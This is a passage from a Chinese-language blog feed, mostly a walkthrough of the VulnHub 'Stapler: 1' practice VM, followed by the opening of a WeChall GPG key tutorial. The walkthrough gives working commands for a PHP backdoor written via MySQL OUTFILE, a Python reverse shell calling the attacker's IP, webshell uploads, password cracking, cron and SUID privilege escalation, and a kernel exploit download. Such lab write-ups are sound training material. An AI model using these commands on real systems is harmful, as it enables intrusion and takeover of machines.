<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit advanced video</span><br><span class="line">searchsploit -m 39646</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/searchsploit-advanced-video.png" alt="searchsploit-advanced-video"></p>
<p>将 EXP 脚本中的 <code>url</code> 变量改为 <a href="https://192.168.153.147:12380/blogblog/">https://192.168.153.147:12380/blogblog/</a> 后，通过 python 执行脚本，发现报错 <code>SSL: CERTIFICATE_VERIFY_FAILED</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/exp-39646-error.png" alt="exp-39646-error"></p>
<p>经探究，需要在 EXP 脚本打上补丁，使其忽略 SSL 的证书校验，具体请参考：</p>
<blockquote>
<p><a href="https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error">urllib and “SSL: CERTIFICATE_VERIFY_FAILED” Error</a></p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/exp-39646-patch.png" alt="exp-39646-patch"></p>
<p>修复报错后，成功执行 EXP 脚本。然而，并无结果回显，无法得知 wp-config.php 文件内容的输出路径。</p>
<p>接下来，使用 dirb 工具，配合其默认字典进行目录扫描。结果显示，可访问目录包括 &#x2F;wp-admin&#x2F;、&#x2F;wp-content&#x2F;、&#x2F;wp-includes&#x2F; 等三个目录，与 WordPress 的默认目录结构相同：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb https://192.168.153.147:12380/blogblog</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/dirb-blogblog.png" alt="dirb-blogblog"></p>
<p>经过一番搜索，终于在 <strong>&#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F;</strong> 目录下发现可疑图像文件，其创建时间与 EXP 脚本执行时间一致：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-blogblog-uploads.png" alt="https-12380-blogblog-uploads"></p>
<p>点击图像文件后，提示报错并且无法打开。将其下载至本地后打印，发现文件内容实际上为 wp-config.php 配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://192.168.153.147:12380/blogblog/wp-content/uploads/412823998.jpeg</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/wget-wp-config.png" alt="wget-wp-config"></p>
<p>仔细查看配置内容，终于发现了后端 MySQL 数据库的<strong>用户名为 root，口令为 plbkac</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/wp-config.png" alt="wp-config"></p>
<h2 id="MySQL-深入探索"><a href="#MySQL-深入探索" class="headerlink" title="MySQL 深入探索"></a>MySQL 深入探索</h2><p>没想到 WordPress 服务居然以 root 用户连接 MySQL，至此意味着已完全掌控了 MySQL 的所有权，极其有利于进一步的信息收集与后渗透利用。</p>
<p>使用 root 用户名与 plbkac 口令登录 MySQL 后，可查看任意数据库名与表名。如查看 wordpress 库中的所有表名：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/mysql-show.png" alt="mysql-show"></p>
<p>其中 <strong>wp_users 表</strong>中存储了 WordPress 的用户相关信息，<strong>user_login 列</strong>为登录用户名，<strong>user_pass 列</strong>为登录口令散列值：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/mysql-wp-users.png" alt="mysql-wp-users"></p>
<p>截取以上 16 个用户的 user_login 与 user_pass 列，按 <code>&lt;key&gt;:&lt;value&gt;</code> 格式排列好，保存至 wp_user_login_pass 文件中。</p>
<p>接下来，使用 john 工具，配合系统自带字典 <code>/var/share/wordlists/rockyou.txt</code> 进行登录口令爆破。结果显示，其中<strong>有 12 个用户使用了弱口令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt wp_user_login_pass</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/john-crack.png" alt="john-crack"></p>
<h1 id="0x04-持续控制"><a href="#0x04-持续控制" class="headerlink" title="0x04 持续控制"></a>0x04 持续控制</h1><h2 id="文件上传-PHP-反弹-shell"><a href="#文件上传-PHP-反弹-shell" class="headerlink" title="文件上传 PHP 反弹 shell"></a>文件上传 PHP 反弹 shell</h2><p>访问 &#x2F;blogblog&#x2F;wp-login.php 文件，弹出 WordPress 控制台登录页面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-blogblog-wp-login.png"></p>
<p>使用 John 用户名与 incorrrect 口令登录后，进入控制台主页：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-blogblog-wp-admin.png" alt="https-12380-blogblog-wp-admin"></p>
<p>点击 Users 导航栏 ，发现 John、Peter、Vicki 用户均为管理员：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-blogblog-wp-users.png"></p>
<p>点击 Plugins 导航栏，发现插件上传安装页面，猜测可能存在文件上传漏洞：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-blogblog-wp-add-plugins.png" alt="https-12380-blogblog-wp-add-plugins"></p>
<p>尝试上传 <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"><strong>php-reverse-shell.php</strong></a> 脚本，其中 <code>$ip</code> 变量为反弹 IP，需改为 Kali Linux 的 192.168.153.148 地址：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/php-reverse-shell.png" alt="php-reverse-shell"></p>
<p>根据反弹 shell 脚本中的设置，使用 nc 工具监听 Kali Linux 的 1234 端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/nc-listening-1234.png" alt="nc-listening-1234"></p>
<p>同样地，在 &#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F; 目录下，发现 php-reverse-shell.php 脚本文件，点击后发现靶机的 shell 已反弹至 Kali Linux 的 1234 端口：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/nc-listening-1234-php-getshell.png" alt="nc-listening-1234-php-getshell"></p>
<p>至此，已获取靶机 www-data 系统用户的 shell，也说明 WordPress 是通过 <strong>www-data</strong> 用户启动的。</p>
<h2 id="文件上传冰蝎-Webshell"><a href="#文件上传冰蝎-Webshell" class="headerlink" title="文件上传冰蝎 Webshell"></a>文件上传冰蝎 Webshell</h2><p>由于 Kali Linux 2020.4 系统自带的 JDK 版本为 11.0.9，无法直接启动 <a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_11"><strong>Behinder_v3.0_Beta_11</strong></a> 版本的 jar 包客户端。因此，本节操作将在 Windows 10 操作系统上，使用1.8.0 版本的 JDK 启动并演示。</p>
<p>打开冰蝎目录下的 server&#x2F;shell.php 脚本文件，可见其默认连接密码为 <strong>rebeyond</strong>。随后，还是通过插件上传页面，将冰蝎 PHP Webshell 上传至 &#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F; 目录下：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/behinder-upload-shell.png" alt="behinder-upload-shell"></p>
<p>使用 java 工具启动冰蝎客户端，右击表格空包处新增 shell，填入 Webshell 上传后的访问路径，及其连接密码 rebeyond：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">java <span class="literal">-jar</span> .\Behinder.jar</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/behinder-new-shell.png" alt="behinder-new-shell"></p>
<p>新增 shell 后，右击打开，成功弹出 Webshell 管理窗口，获取到靶机 www-data 系统用户的 shell：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/behinder-get-shell.png" alt="behinder-get-shell"></p>
<h2 id="MySQL-写入命令执行函数"><a href="#MySQL-写入命令执行函数" class="headerlink" title="MySQL 写入命令执行函数"></a>MySQL 写入命令执行函数</h2><p>先使用 elly 用户名与 ylle 口令登录 FTP 服务，下载 Apache 配置文件 apache2&#x2F;sites-available&#x2F;default-ssl.conf 文件后，发现其 HTTPS 服务的根路径为 <strong>&#x2F;var&#x2F;www&#x2F;https</strong>，具体请参考：</p>
<blockquote>
<p><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04">How To Create a Self-Signed SSL Certificate for Apache in Ubuntu 18.04</a></p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/get-default-ssl.png" alt="get-default-ssl"></p>
<p>再使用 root 用户名与 plbkac 口令登录 MySQL，在 WordPress 服务的 &#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F; 目录下，写入带有 PHP 命令执行函数的后门文件 <strong>exec.php</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; into outfile &quot;/var/www/https/blogblog/wp-content/uploads/exec.php&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/mysql-select-info-outfile.png" alt="mysql-select-info-outfile"></p>
<p>尝试通过 <code>cmd=id</code> 参数访问该文件，发现确实能够返回 <code>id</code> 系统命令的执行结果：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/https-12380-blogblog-exec-id.png" alt="https-12380-blogblog-exec-id"></p>
<p>接下来，使用 nc 工具监听 Kali Linux 的 1234 端口，再通过 <code>cmd</code> 参数传入 Python 反弹 shell，命令执行后，成功获取到靶机 www-data 系统用户的 shell：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.153.148&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/nc-listening-1234-python-getshell.png" alt="nc-listening-1234-python-getshell"></p>
<h1 id="0x05-权限提升"><a href="#0x05-权限提升" class="headerlink" title="0x05 权限提升"></a>0x05 权限提升</h1><h2 id="Sudo-提权"><a href="#Sudo-提权" class="headerlink" title="Sudo 提权"></a>Sudo 提权</h2><p>获取靶机 shell 环境后，首先从各个用户的 .bash_history 命令操作日志着手，搜索其中有价值的信息。</p>
<p>打印出日志后，发现两条包含了用户名与口令的 ssh 连接命令，其中 <strong>JKanode 用户的口令为 thisimypassword，peter 用户的口令为 JZQuyIN5</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/*/.bash_history | grep -v <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/cat-bash-history.png" alt="cat-bash-history"></p>
<p>经验证，JKanode 与 peter 用户均能登录成功，其中 peter 用户会返回一个 zsh，按下 <code>q</code> 退出其配置初始化过程后，执行 <code>whoami &amp;&amp; id</code> 命令查看用户信息，发现 <strong>peter 用户拥有 sudo 用户组权限</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/ssh-peter.png" alt="ssh-peter"></p>
<p>执行 <code>sudo -l</code> 命令并输入密码，发现 peter 用户的 sudo 权限为 <strong>(ALL : ALL) ALL</strong>，表示 peter 用户可以在任何主机上，以任意用户的身份执行任意命令，具体请参考：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/jing99/p/9323080.html">linux详解sudoers</a></p>
</blockquote>
<p>最后执行 <code>sudo su - root</code> 命令，即可获得 root 用户权限：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/sudo-root.png" alt="sudo-root"></p>
<h2 id="Cron-Jobs-提权"><a href="#Cron-Jobs-提权" class="headerlink" title="Cron Jobs 提权"></a>Cron Jobs 提权</h2><p>获取靶机 shell 环境后，还可以查看 cron 计划任务，搜索其中有价值的信息。</p>
<p>打印 cron 计划任务文件列表，发现若干可疑文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /etc/*cron*</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/ls-cron-jobs.png" alt="ls-cron-jobs"></p>
<p>经过一番搜索，在 <strong>&#x2F;etc&#x2F;cron.d&#x2F;logrotate</strong> 计划任务中，发现以 <strong>root</strong> 用户执行的 shell 脚本 <strong>&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;cron-logrotate.sh</strong>，该脚本 5 分钟执行一次，但无实际任务执行。</p>
<p>此外，脚本权限为 <strong><code>-rwxrwxrwx</code><strong>，说明</strong>任何用户可在此设置计划任务，并以 root 用户权限执行</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/ls-cron-logrotate.png" alt="ls-cron-logrotate"></p>
<p>接下来设置计划任务，将 &#x2F;bin&#x2F;bash 文件复制为 <strong>&#x2F;tmp&#x2F;getroot</strong> 文件，将其属主改为 <strong><code>root:root</code></strong> ，并赋予 SUID 权限 <strong><code>-rwsr-xr-x</code></strong> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp /bin/bash /tmp/getroot; chown root:root /tmp/getroot; chmod u+s /tmp/getroot&quot;</span> &gt;&gt; /usr/local/sbin/cron-logrotate.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/get-bash-with-suid.png" alt="get-bash-with-suid"></p>
<p>等待 5 分钟后，触发计划任务执行，发现 &#x2F;tmp&#x2F;getroot 文件创建成功，并且其属主与权限均符合预期。</p>
<p>最后执行 <code>/tmp/getroot -p</code> 命令，能够以 root 用户权限启动 bash，即可获得 root 用户的命令执行环境：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/get-root-by-bash.png" alt="get-root-by-bash"></p>
<h2 id="CVE-2016-4557-内核漏洞提权"><a href="#CVE-2016-4557-内核漏洞提权" class="headerlink" title="CVE-2016-4557 内核漏洞提权"></a>CVE-2016-4557 内核漏洞提权</h2><p>获取靶机 shell 环境后，查看系统内核与发行版相关信息。结果显示，靶机系统内核版本为 <strong>4.4.0-21-generic</strong>，发行版为 <strong>Ubuntu 16.04 LTS</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/system-info.png" alt="system-info"></p>
<p>针对 Ubuntu 16.04 LTS 发行版，使用 searchsploit 工具搜索相关漏洞利用脚本。结果显示，<strong>Linux Kernel 4.4.x 内核存在<a href="https://www.exploit-db.com/exploits/39772">本地权限提升漏洞（EDB-ID 39772）</a></strong> ，并将其 EXP 说明文档复制到当前目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04 privilege escalation</span><br><span class="line">searchsploit -m 39772</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/searchsploit-ubuntu.png" alt="searchsploit-ubuntu"></p>
<p>根据文档下方提示，从 Github 下载 EXP 代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/wget-exp-39772.png" alt="wget-exp-39772"></p>
<p>使用 unzip 工具解压 39772.zip 文件后，文档提示需将 EXP 代码压缩包 <strong>39772&#x2F;exploit.tar</strong> 上传至目标主机，再通过执行 <code>./compile.sh</code> 与 <code>./doubleput</code> 命令完成提权。</p>
<p>在 39772&#x2F; 目录下，通过 python 启动一个简单 HTTP 服务的端口监听：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/unzip-39772.png" alt="unzip-39772"></p>
<p>回到靶机 shell 环境，将 exploit.tar 文件下载至本地，并使用 tar 工具解压：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.153.148:8000/exploit.tar</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/wget-exploit-tar.png" alt="wget-exploit-tar"></p>
<p>最后在 ebpf_mapfd_doubleput_exploit&#x2F; 目录下，执行 <code>./compile.sh</code> 与 <code>./doubleput</code> 命令，即可获得 root 用户权限：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/get-root-by-exp.png" alt="get-root-by-exp"></p>
<h1 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h1><p>获取 root 用户权限后，在其主目录下发现 flag.txt 文件，最终得到 flag 为 <strong>b6b545dc11b7a270f4bad23432190c75162c4a2b</strong>，至此宣告靶机渗透过程结束：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/vulnhub-stapler-1/cat-flag.png" alt="cat-flag"></p>
<p>磕磕绊绊地，总算完成了 <a href="https://www.vulnhub.com/entry/stapler-1,150/">Stapler: 1</a> 靶机渗透练习，不仅从中丰富了自己的工具库，而且还学习到了各类漏洞的利用方法，拓展了渗透测试思路，可谓是收获良多，感谢 <a href="https://twitter.com/g0tmi1k">g0tmi1k</a> 等大佬提供的靶机练习。</p>
<p>由于笔者水平有限，本文渗透思路多借鉴于以下 writeup，但也不乏创新思路点。对于<strong>持续控制</strong>与<strong>权限提升</strong>技巧，勉强达到靶机要求的合格水平，各位若有其他新颖独特的思路，还望不吝赐教，多多交流。</p>
<p>本文涉及的文章参考，请移步至：</p>
<blockquote>
<p><a href="https://bond-o.medium.com/vulnhub-stapler-1-ab928900d614">VulnHub — Stapler: 1</a><br><a href="https://medium.com/@Kan1shka9/stapler-1-walkthrough-e1f2a667ea4">Stapler: 1 Walkthrough</a><br><a href="https://jhalon.github.io/vulnhub-stapler1/">VulnHub ‘Stapler: 1’ - CTF</a><br><a href="https://www.cnblogs.com/autopwn/p/13864611.html">Vulnhub-靶机-STAPLER: 1</a><br><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a><br><a href="https://blog.csdn.net/qq_39192827/article/details/85872025">VMware虚拟机三种网络模式：桥接模式，NAT模式，仅主机模式</a></p>
</blockquote>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>PHP</tag>
        <tag>Vulnhub</tag>
        <tag>VM</tag>
        <tag>Pentest</tag>
        <tag>Exploit</tag>
        <tag>CMS</tag>
        <tag>Trojan</tag>
        <tag>Vulnerability</tag>
        <tag>Python</tag>
        <tag>Database</tag>
        <tag>Privilege</tag>
        <tag>Linux</tag>
        <tag>Bash</tag>
        <tag>FTP</tag>
        <tag>SSH</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>【WeChall】 Training：GPG</title>
    <url>/2019/05/01/wechall-training-gpg/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本题要求使用 GPG 为邮件通讯内容设置加密功能，一是为了保证邮件内容的机密性，二是为了让用户熟悉 GPG 的基本使用方法。</p>
<p>本题的解决过程如下：先使用 GPG <strong>生成公私钥对</strong>，在 WeChall 的账户设置中将公钥上传，接着 WeChall 会向用户邮箱发送一封加密邮件，解密后得到一条用于<strong>确认公钥有效性</strong>的验证链接，点击并完成公钥设置。最后，回到题目链接，点击按钮后 WeChall 会再发送一封加密邮件，<strong>解密后即可得到 flag</strong>。</p>
<p>备注：本题主要操作在虚拟机的 Kali Linux 2018.2 系统中完成，其中自带的 GPG 版本为 2.2.5，辅助操作在本机的 Windows 7 系统中完成。</p>
<ul>
<li>题目链接：<a href="https://www.wechall.net/challenge/training/crypto/gpg/index.php">https://www.wechall.net/challenge/training/crypto/gpg/index.php</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-gpg/question.png" alt="question"></p>
<h1 id="0x01-生成公私钥对"><a href="#0x01-生成公私钥对" class="headerlink" title="0x01 生成公私钥对"></a>0x01 生成公私钥对</h1><p><a href="https://en.wikipedia.org/wiki/GNU_Privacy_Guard"><strong>GPG（GNU Privacy Guard）</strong></a>自由软件基金会 GNU 计划中的一款加密软件，其中包含了多种对称加密算法、非对称加密算法、数字签名算法、杂凑算法等，目的是替代 1991 年 <a href="https://en.wikipedia.org/wiki/Phil_Zimmermann">Phil Zimmermann</a> 开发的商业加密软件 <a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy"><strong>PGP（Pretty Good Privacy）</strong></a>，给普通用户的通讯信息提供安全保护。</p>
<p>在 GPG 2.2.5 版本中，生成公私钥对有两个参数：<code>--generate-key</code> 与 <code>--full-generate-key</code>。前者是快速生成密钥对，只需填入用户 ID 与邮箱以标识身份，默认使用 3072 位的 RSA 算法，有效期 2 年；后者是完全生成密钥对，还提供了密钥种类、密钥长度、密钥有效期等设置。</p>
<p>在达到我们需求的情况下，操作越简洁越好，此处选择 <code>--generate-key</code> 参数快速生成密钥对。填入用户 ID 与邮箱后，要求在弹框内输入授权口令，以保证私钥的合法使用，最后需要敲打键盘或移动鼠标，给随机数的生成提供足够的信息熵。快速生成密钥对的过程如下：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-gpg/gen.png" alt="gen"></p>
<p>公私钥对生成后，通过 <code>--list-keys</code> 参数可查看公钥信息，<code>--list-secret-keys</code> 参数可查看私钥信息，<code>--list-signatures</code> 参数可查看签名信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/wechall-training-gpg/list.png" alt="list"></p>
<h1 id="0x02-验证公钥有效性"><a href="#0x02-验证公钥有效性" class="headerlink" title="0x02 验证公钥有效性"></a>0x02 验证公钥有效性</h1><p>首先，输出公钥文件，其中 <code>--armor</code> 参数指定以 ASCII 格式输出公钥，<code>--output</code> 参数指定输出文件名，<code>--export</code> 参数指定用户 ID：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Export ciphersaw&#x27;s public key in ASCII format</span></span><br><span class="line">gpg --armor --output pubkey --<span class="built_in">export</span> ciphersaw</span><br></pre></td></tr></table></figure>

<p>输出的公钥具有特定的存储格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><br><span class="line"></span><br><span class="line">mQGNBFzJCdsBDACrU4AQC+Q0BnaDfbk3f47p4pKvytn4L/DyIdSSOXTZxUv6nRsO</span><br><span class="line">XpLDog+vVszrn+9AeyoRkwRRwpgHL4de+Q7HkLihh10BcwAAfU9l/jEaNGDrHJ+b</span><br><span class="line">0NZyRU3SLQPPgLxjFjphVDiCrU56HaPb8nDxYsaOXIGhE0DNHJZSaECydR59D06/</span><br><span class="line">+3IqoUtcIRdJKQ2xC4IU4KqMvJG7YyJ74abTnHeOieNEvK3NhwSfGPSNZQoNOte6</span><br><span class="line">d5AdpXutma7psl+Gb5dMPd4j7G7kSpGUYIk2n8hhId/qif/y7cDzr4MfwInnInT/</span><br><span class="line">L7uYzrvzhluYfmwijSeAljVuxT5q7rdYdaCuWPv0iKibZA7Bsywc/3DYZWj1nkBS</span><br><span class="line">69xFGzRy1y62ksAF+tqL0U5rvtT/9l92bKq5ErcjSMtpRBIE3WI4Y9pz6va2XJ6d</span><br><span class="line">j9XSFVZJc5bOt9E8IbblJ5EvJJLjSp50MqR9IwwHPgViPcmOKVKTghjRA9h91dNg</span><br><span class="line">nmQSBk5OCWTRFUEAEQEAAbQfY2lwaGVyc2F3IDxjaXBoZXJzYXdAZ21haWwuY29t</span><br><span class="line">PokB1AQTAQoAPhYhBHekGnoj9i73L2Wnp5jiYilVs4rdBQJcyQnbAhsDBQkDwmcA</span><br><span class="line">BQsJCAcCBhUKCQgLAgQWAgMBAh4BAheAAAoJEJjiYilVs4rdUyIL/0BHCQ8RglQh</span><br><span class="line">eQn/57+6pO1hy5CF2oYKFAzEokA1alsvusRt59q5cxSNXTXNhW4Ylj+NU41o2XWP</span><br><span class="line">ThJiOag8KMfIgkfM7a269VjZvcbUzkLBofG/e8Y1Uk63UAlnPdKgvrHZIobE78ZC</span><br><span class="line">5LSFT3goi38aiaa48pGGCKSe9a46L7Vn9MkJ4Wt/epZ/pkFTnOAtyE5HNxbPsBvE</span><br><span class="line">/ZkLuOkScm997SehjSfUSJHc6bmsXVrRoijmE2IDlzFrv8URj4q31ETv68waPlIl</span><br><span class="line">gul7Dt30U3HhhA9Yz8eLiK3qXtBTl7xIzqmm85s9BVkiYYLwX7zZHmITG72KlwKX</span><br><span class="line">25OLdGZ7ZdJ86cfluQsiJ0Bmfa/HLPfIWBLq8A5Z23zL0z1flAf+TgYkUr8lFft4</span><br><span class="line">Rg2HUX+Cud2PinR80fyK+YpXwKwjYUvA79ymH31uG+9cA7V+IDHS3YY1xuilMSLy</span><br><span class="line">MvY3yOuqj6y7WHUP3qAFvCVj9gjL8wEMi1s/10M+xhBFvVZ56P/Tv7kBjQRcyQnb</span><br><span class="line">AQwArasfOLg73NkVbTu09sJSBq1L88pd7X8mf7dAuCLapQhkdYSLigCJd5TPYZq7</span><br><span class="line">8KdgZpVrqJ62hYhx3MAJK5nZMhliRC5gl8GzTdO5XHnkIqXr5a14WB8KA81Vq+At</span><br><span class="line">5xFOoRF3EKHeozDKDEu/ljkWhU6en1RY++61+bs6iZ+TSwhXrPwudcUt2v4AT14N</span><br><span class="line">0/76J57U0iNdc1BKxjD+U+gbaMIZ+C0ioFuIxSOwSJ3kuQzExxjwAnD3JC8QxURn</span><br><span class="line">ryUmsjmV4JmNuAVqjL40NPxxme8bdto9/+m2Wr0Zx+3bLjsXO8kyccP9qIcubRJt</span><br><span class="line">L447uzEon3mjXWyrDtkm6c1hkv08/cqVA5D5ESVh5veWDcB0dER6v+UlvFrrSgH8</span><br><span class="line">wLTuHuLkWfNRVbVrIR+sVgTS31UwfoKSkFhjWoedW/1KCD05J+bbaRVcH+mm4Zva</span><br><span class="line">WuzZhma0w4HYQ9hZGWLBgMTIir2sFKnLn6ENvO25eO9eD4O78VGFw2QXCbgeiRN8</span><br><span class="line">y9VDABEBAAGJAbwEGAEKACYWIQR3pBp6I/Yu9y9lp6eY4mIpVbOK3QUCXMkJ2wIb</span><br><span class="line">DAUJA8JnAAAKCRCY4mIpVbOK3WloDACgQxMyttlJsCQZghtmSkQE2kICKOcBrTnm</span><br><span class="line">4Wsu+Jq+97trYfw2Q0Lw/7xb5M9XxNTbAxkZnuIa9PGgk/UdRRj30O/l0sFoZi40</span><br><span class="line">Lr3gY3JVq6vARZ3kfhv2587TdEGgriknsi9nesgSDZbgVpT7gT2ku3fUlXeA8Fad</span><br><span class="line">/nkkYnQNEaOrnDk+wJIq74z28/Qz7YM9cPDDbET9cXUmaRKTcR3Zx3V/J525oIWs</span><br><span class="line">ODts4nJ2SLIR2DQVxTEj6Nd9fNeHXLit2qw/TsIAazuHd89/IJvxO74sP38Cv3p9</span><br><span class="line">DMY31H16gUhvw0KBIelQzFXAxRy3ZVmQBHt4JfbRskPYk2UNyjJKSfP24VwVH+Bz</span><br><span class="line">/L077rlhFGppRLstJahoh8VbXMSspNeykMgo0ushPsc/WpMg13pLOczAS1WDxGCa</span><br><span class="line">Qhla4/6ExD9AILow1kpDcvCCHeGcPtueplwL3Q3+V9Osomsplegl7UAvlfURkyVz</span><br><span class="line">49RD5y99bvDQhVy27RZszHinctF1du8=</span><br><span class="line">=OHhr</span><br><span class="line">-----END PGP PUBLIC KEY BLOCK-----</span><br></pre></td></tr></table></figure>

<p>接下来，将上述公钥复制到 WeChall 的账户设置中，点击 <strong>Upload Key</strong> 上传公钥：</p>
